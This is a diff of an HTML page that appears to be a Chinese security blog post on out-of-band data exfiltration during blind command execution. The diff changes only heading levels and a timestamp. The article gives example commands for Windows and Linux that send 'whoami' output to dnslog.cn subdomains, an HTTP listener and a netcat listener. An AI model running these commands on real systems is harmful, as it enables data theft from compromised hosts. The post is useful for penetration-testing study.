@@ -33,7 +33,7 @@
 <meta property="og:image" content="http://example.com/2024/02/03/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%97%A0%E5%9B%9E%E6%98%BE%E4%B8%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%A4%96%E5%B8%A6/2024-02-03_09-31.png">
 <meta property="og:image" content="http://example.com/2024/02/03/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%97%A0%E5%9B%9E%E6%98%BE%E4%B8%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%A4%96%E5%B8%A6/2024-02-03_09-29.png">
 <meta property="article:published_time" content="2024-02-03T02:08:26.000Z">
-<meta property="article:modified_time" content="2024-02-03T03:07:26.997Z">
+<meta property="article:modified_time" content="2024-02-03T03:10:04.884Z">
 <meta property="article:author" content="liuty">
 <meta property="article:tag" content="技巧总结">
 <meta name="twitter:card" content="summary_large_image">
@@ -320,13 +320,13 @@
             
               <div class="markdown-body">
                 
-                <h2 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h2><p>在注入时, 存在盲注或者延时, 我们获得需要数据就会频繁请求, 最后导致IP 被Ban,还有就是当我们进行命令执行的时候，目标站点什么也不显示,无法确定,所以用DNSlog外带可以减少请求并且直接回显数据<br>dnslog 数据外带通常用在以下情景：</p>
+                <h3 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h3><p>在注入时, 存在盲注或者延时, 我们获得需要数据就会频繁请求, 最后导致IP 被Ban,还有就是当我们进行命令执行的时候，目标站点什么也不显示,无法确定,所以用DNSlog外带可以减少请求并且直接回显数据<br>dnslog 数据外带通常用在以下情景：</p>
 <p>1.SQL盲注<br>2.无回显的XSS<br>3.无回显的命令执行<br>5.无回显的SSRF<br>5.Blind XXE</p>
-<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>将需要查询的值和域名拼接起来，向域名发送请求，便会传递到自己这里，然后通过读日志获取信息。为了方便理解，我自己模糊的做了一个原理图</p>
+<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>将需要查询的值和域名拼接起来，向域名发送请求，便会传递到自己这里，然后通过读日志获取信息。为了方便理解，我自己模糊的做了一个原理图</p>
 <img src="/2024/02/03/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%97%A0%E5%9B%9E%E6%98%BE%E4%B8%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%A4%96%E5%B8%A6/2024-02-03_10-36.png" srcset="/img/loading.gif" lazyload class="" title="2024-02-03_10-36.png">
 
 
-<h2 id="Windows中的利用方式"><a href="#Windows中的利用方式" class="headerlink" title="Windows中的利用方式"></a>Windows中的利用方式</h2><h1 id="for-ping"><a href="#for-ping" class="headerlink" title="for + ping"></a>for + ping</h1><p>命令示例：for &#x2F;F “delims&#x3D;&quot; %i in (‘whoami’) do ping %i.xxx.dnslog.cn</p>
+<h3 id="Windows中的利用方式"><a href="#Windows中的利用方式" class="headerlink" title="Windows中的利用方式"></a>Windows中的利用方式</h3><h2 id="for-ping"><a href="#for-ping" class="headerlink" title="for + ping"></a>for + ping</h2><p>命令示例：for &#x2F;F “delims&#x3D;&quot; %i in (‘whoami’) do ping %i.xxx.dnslog.cn</p>
 <img src="/2024/02/03/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%97%A0%E5%9B%9E%E6%98%BE%E4%B8%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%A4%96%E5%B8%A6/2024-02-03_09-40.png" srcset="/img/loading.gif" lazyload class="" title="2024-02-03_09-40.png">
 
 
@@ -334,25 +334,25 @@
 <img src="/2024/02/03/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%97%A0%E5%9B%9E%E6%98%BE%E4%B8%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%A4%96%E5%B8%A6/2024-02-03_09-42.png" srcset="/img/loading.gif" lazyload class="" title="2024-02-03_09-42.png">
 
 
-<h1 id="用户名变量"><a href="#用户名变量" class="headerlink" title="%用户名变量%"></a>%用户名变量%</h1><p>直接通过%用户变量%来获取信息</p>
+<h2 id="用户名变量"><a href="#用户名变量" class="headerlink" title="%用户名变量%"></a>%用户名变量%</h2><p>直接通过%用户变量%来获取信息</p>
 <img src="/2024/02/03/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%97%A0%E5%9B%9E%E6%98%BE%E4%B8%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%A4%96%E5%B8%A6/2024-02-03_09-56.png" srcset="/img/loading.gif" lazyload class="" title="2024-02-03_09-56.png">
 
 <img src="/2024/02/03/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%97%A0%E5%9B%9E%E6%98%BE%E4%B8%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%A4%96%E5%B8%A6/2024-02-03_09-51.png" srcset="/img/loading.gif" lazyload class="" title="2024-02-03_09-51.png">
 
 
-<h2 id="Linux中的利用方式"><a href="#Linux中的利用方式" class="headerlink" title="Linux中的利用方式"></a>Linux中的利用方式</h2><h1 id="反引号-ping"><a href="#反引号-ping" class="headerlink" title="反引号 + ping"></a>反引号 + ping</h1><p>命令示例：ping <code>whoami</code>.foxd5a.dnslog.cn</p>
+<h3 id="Linux中的利用方式"><a href="#Linux中的利用方式" class="headerlink" title="Linux中的利用方式"></a>Linux中的利用方式</h3><h2 id="反引号-ping"><a href="#反引号-ping" class="headerlink" title="反引号 + ping"></a>反引号 + ping</h2><p>命令示例：ping <code>whoami</code>.foxd5a.dnslog.cn</p>
 <img src="/2024/02/03/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%97%A0%E5%9B%9E%E6%98%BE%E4%B8%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%A4%96%E5%B8%A6/2024-02-03_09-20.png" srcset="/img/loading.gif" lazyload class="" title="2024-02-03_09-20.png">
 
 
-<h1 id="ping"><a href="#ping" class="headerlink" title="$() + ping"></a>$() + ping</h1><p>命令示例：ping $(whoami).dyy8n3.dnslog.cn</p>
+<h2 id="ping"><a href="#ping" class="headerlink" title="$() + ping"></a>$() + ping</h2><p>命令示例：ping $(whoami).dyy8n3.dnslog.cn</p>
 <img src="/2024/02/03/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%97%A0%E5%9B%9E%E6%98%BE%E4%B8%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%A4%96%E5%B8%A6/2024-02-03_09-23.png" srcset="/img/loading.gif" lazyload class="" title="2024-02-03_09-23.png">
 
 
-<h1 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h1><p>命令示例：curl <a target="_blank" rel="noopener" href="http://192.168.43.190:8000/%60whoami%60">http://192.168.43.190:8000/`whoami`</a></p>
+<h2 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h2><p>命令示例：curl <a target="_blank" rel="noopener" href="http://192.168.43.190:8000/%60whoami%60">http://192.168.43.190:8000/`whoami`</a></p>
 <img src="/2024/02/03/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%97%A0%E5%9B%9E%E6%98%BE%E4%B8%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%A4%96%E5%B8%A6/2024-02-03_09-31.png" srcset="/img/loading.gif" lazyload class="" title="2024-02-03_09-31.png">
 
 
-<h1 id="whois"><a href="#whois" class="headerlink" title="whois"></a>whois</h1><p>命令示例：whois -h 192.168.233.128 -p 8888 <code>whoami</code><br>vps上nc开启监听，获取到命令执行结果</p>
+<h2 id="whois"><a href="#whois" class="headerlink" title="whois"></a>whois</h2><p>命令示例：whois -h 192.168.233.128 -p 8888 <code>whoami</code><br>vps上nc开启监听，获取到命令执行结果</p>
 <img src="/2024/02/03/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%97%A0%E5%9B%9E%E6%98%BE%E4%B8%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%A4%96%E5%B8%A6/2024-02-03_09-29.png" srcset="/img/loading.gif" lazyload class="" title="2024-02-03_09-29.png">
 
                 
